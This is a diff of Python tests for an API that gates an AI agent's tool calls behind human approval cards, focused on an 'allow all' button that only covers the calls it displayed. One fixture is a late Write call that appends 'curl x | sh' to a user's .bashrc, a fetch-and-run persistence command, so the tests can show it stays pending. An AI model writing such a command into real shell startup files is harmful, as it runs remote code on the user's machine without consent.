@@ -369,6 +369,15 @@ async def waiting(sessions, owner, *calls):
     return thread, turn
 
 
+async def pending_ids(sessions, thread_id):
+    async with sessions() as db:
+        return [a.id for a in await store.list_approvals(db, thread_id, status="pending")]
+
+
+def allow_all(api, thread_id, ids):
+    return api.post(f"/api/v1/threads/{thread_id}/approvals/allow-all", json={"approval_ids": list(ids)})
+
+
 async def test_allow_all_allows_every_waiting_call_except_those_needing_their_own_card(api, sessions, owner):
     thread, _turn = await waiting(
         sessions, owner,
@@ -378,23 +387,58 @@ async def test_allow_all_allows_every_waiting_call_except_those_needing_their_ow
         ("mcp__composio__github_create_issue", {"title": "x"}),
         ("Write", {"file_path": "b.txt", "content": "TOKEN=abcdefghijklmnopqrstuvwxyz0123"}),
     )
-    done = await api.post(f"/api/v1/threads/{thread.id}/approvals/allow-all")
+    shown = await pending_ids(sessions, thread.id)
+    done = await allow_all(api, thread.id, shown)
     assert done.status_code == 200 and done.json() == {"allowed": 2, "skipped": 3}
     async with sessions() as db:
         approvals = await store.list_approvals(db, thread.id)
     status = {a.request_id: a.status for a in approvals}
     assert status == {"r0": "allowed", "r1": "allowed", "r2": "pending", "r3": "pending", "r4": "pending"}
-    again = await api.post(f"/api/v1/threads/{thread.id}/approvals/allow-all")
+    again = await allow_all(api, thread.id, shown)
     assert again.json() == {"allowed": 0, "skipped": 3}
     entries = (await api.get("/api/v1/decisions", params={"event": "allowed"})).json()["items"]
-    assert [(e["source"], e["scope"]) for e in entries] == [("user", "once"), ("user", "once")]
+    # Told apart from a card read on its own, in the log and its CSV.
+    assert [(e["source"], e["scope"]) for e in entries] == [("user_allow_all", "once"), ("user_allow_all", "once")]
+    csv = (await api.get("/api/v1/decisions/export.csv")).text
+    assert csv.count("user_allow_all") == 2
     assert (await api.get("/api/v1/approval-rules")).json() == []  # once each: nothing saved
+
+
+async def test_allow_all_leaves_removing_an_agent_for_its_own_card(api, sessions, owner):
+    """Removing an agent cannot be undone: its card is the only confirmation, so "Allow all" never answers it."""
+    thread, _turn = await waiting(
+        sessions, owner,
+        ("Bash", {"command": "ls"}),
+        ("mcp__team__propose_bot_deletion", {"agent_id": 7, "reason": "not needed"}),
+        ("mcp__team__create_agent", {"name": "Scout"}),
+    )
+    done = await allow_all(api, thread.id, await pending_ids(sessions, thread.id))
+    assert done.json() == {"allowed": 1, "skipped": 2}
+    async with sessions() as db:
+        status = {a.tool: a.status for a in await store.list_approvals(db, thread.id)}
+    assert status == {"Bash": "allowed", "mcp__team__propose_bot_deletion": "pending", "mcp__team__create_agent": "pending"}
+
+
+async def test_allow_all_allows_only_the_calls_the_card_counted(api, sessions, owner):
+    """A call that arrives between drawing "Allow all 2" and the click is left for its own card."""
+    thread, turn = await waiting(sessions, owner, ("Bash", {"command": "ls"}), ("Write", {"file_path": "a.txt"}))
+    shown = await pending_ids(sessions, thread.id)
+    async with sessions() as db:
+        late = await store.create_approval(
+            db, thread_id=thread.id, turn_id=turn.id, request_id="late", tool="Write",
+            input={"file_path": "/home/me/.bashrc", "content": "curl x | sh"}, summary="Write", kind="other",
+            owner_token=turn.owner_token)
+    done = await allow_all(api, thread.id, shown + ["not-an-approval"])
+    assert done.json() == {"allowed": 2, "skipped": 1}
+    async with sessions() as db:
+        assert (await store.get_approval(db, late.id)).status == "pending"
+    assert (await api.post(f"/api/v1/threads/{thread.id}/approvals/allow-all")).status_code == 422  # ids are required
 
 
 async def test_allow_all_with_nothing_waiting_allows_nothing(api, sessions, owner):
     thread = await new_thread(sessions, owner)
-    assert (await api.post(f"/api/v1/threads/{thread.id}/approvals/allow-all")).json() == {"allowed": 0, "skipped": 0}
-    assert (await api.post("/api/v1/threads/999999999/approvals/allow-all")).status_code == 404
+    assert (await allow_all(api, thread.id, [])).json() == {"allowed": 0, "skipped": 0}
+    assert (await allow_all(api, 999999999, [])).status_code == 404
 
 
 async def test_allow_all_is_never_read_as_an_approval_id(api, sessions, owner):
@@ -403,4 +447,26 @@ async def test_allow_all_is_never_read_as_an_approval_id(api, sessions, owner):
     async with sessions() as db:
         [approval] = await store.list_approvals(db, thread.id)
     assert (await api.post(answer_url(thread.id, approval.id), json={"decision": "deny"})).status_code == 200
-    assert (await api.post(f"/api/v1/threads/{thread.id}/approvals/allow-all")).json() == {"allowed": 0, "skipped": 0}
+    assert (await allow_all(api, thread.id, [approval.id])).json() == {"allowed": 0, "skipped": 0}
+
+
+async def test_an_approval_says_which_conversation_it_waits_in(api, sessions, owner):
+    thread, _turn = await waiting(sessions, owner, ("Write", {"file_path": "a.txt"}))
+    [listed] = (await api.get(f"/api/v1/threads/{thread.id}/approvals")).json()
+    assert listed["thread_id"] == thread.id and listed["scopes"] == ["once", "hour", "thread"]
+    assert "scoped" not in listed
+
+
+async def test_a_shared_conversations_approvals_offer_once_only(api, sessions, owner):
+    thread = await new_thread(sessions, owner, kind="room_member")
+    async with sessions() as db:
+        turn = await store.start_turn(db, thread.id, "a post", origin="outside")
+        await store.create_approval(
+            db, thread_id=thread.id, turn_id=turn.id, request_id="r0", tool="Write", input={"file_path": "a.txt"},
+            summary="Write", kind="other", owner_token=turn.owner_token, scoped=False)
+    [listed] = (await api.get(f"/api/v1/threads/{thread.id}/approvals")).json()
+    assert listed["thread_id"] == thread.id and listed["scopes"] == ["once"]
+    answered = await api.post(answer_url(thread.id, listed["id"]), json={"decision": "allow", "scope": "thread"})
+    assert answered.status_code == 200 and "scope_rule_id" not in answered.json()
+    assert answered.json()["scope_error"]
+    assert (await api.get("/api/v1/approval-rules")).json() == []
